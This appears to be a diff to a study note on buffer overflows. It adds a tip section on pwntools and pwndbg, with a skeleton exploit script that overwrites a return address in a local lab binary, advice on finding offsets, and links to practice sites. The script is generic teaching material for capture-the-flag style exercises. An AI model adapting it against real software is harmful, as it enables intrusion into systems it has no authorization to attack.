@@ -45,3 +45,27 @@ From a defender's side, modern compilers and OS features have made classic buffe
 - Shellcode: small machine code payload injected by the attacker that typically spawns a shell
 - ASLR (Address Space Layout Randomization): OS feature that randomizes memory addresses each run, making it harder to predict where to jump
 
+## One Tip / Tool
+
+Tool: `pwndbg` + `pwntools` — the standard toolkit for buffer overflow exploitation and CTF challenges
+
+```bash
+# install pwntools
+pip install pwntools
+
+# basic pwntools script to interact with a vulnerable binary
+from pwn import *
+
+p = process('./vulnerable_program')
+
+offset = 112  # number of bytes to reach the return address
+ret_address = p64(0xdeadbeef)  # address to jump to
+
+payload = b'A' * offset + ret_address
+p.sendline(payload)
+p.interactive()
+```
+
+For finding the exact offset use `cyclic` from pwntools or `pattern_create` from Metasploit — they generate a unique pattern so you can identify exactly where the return address gets overwritten.
+
+Practice buffer overflows safely on **pwn.college** or **exploit.education** — both are free platforms built specifically for learning binary exploitation.
